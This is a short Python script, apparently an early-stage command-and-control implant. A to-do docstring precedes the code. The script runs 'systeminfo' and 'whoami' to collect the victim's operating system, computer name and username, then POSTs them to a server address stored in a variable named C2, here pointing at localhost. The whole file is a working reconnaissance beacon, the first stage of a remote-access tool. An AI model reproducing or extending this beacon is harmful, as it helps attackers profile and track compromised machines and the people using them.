"""
Agent
[X] grab operating_system, computer_name, username
[] Send POST req to server
"""

import os
import re
import requests

INDEX_COMPUTER_NAME = 0
INDEX_USERNAME = 1
RE_DATA_AFTER_MULTIPLE_SPACES = r'(.*): +(.*)'
C2 = r'http://127.0.0.1:8000/get'


def get_os():
    """Uses systeminfo to obtain the OS and OS Version
    Returns the concatenated string"""
    os_version = ''
    output_systeminfo = os.popen('systeminfo')
    for output in output_systeminfo.read().splitlines()[2:4]:
        info = re.match(RE_DATA_AFTER_MULTIPLE_SPACES, output)
        os_version += info.groups()[1]
        os_version += ' - '
    return os_version.rstrip(' -')


def get_computer_and_username():
    """Uses whoami to get the computer name and user name
    Returns it in a list"""
    output_whoami = os.popen('whoami')
    return output_whoami.read().strip().split('\\')


def say_hello():
    post_object = {
        'operating_system': get_os(),
        'computer_name': get_computer_and_username()[INDEX_COMPUTER_NAME],
        'username': get_computer_and_username()[INDEX_USERNAME]
    }
    res = requests.post(C2, data = post_object)

    print(res.text)


def main():
    say_hello()


if __name__ == '__main__':
    main()
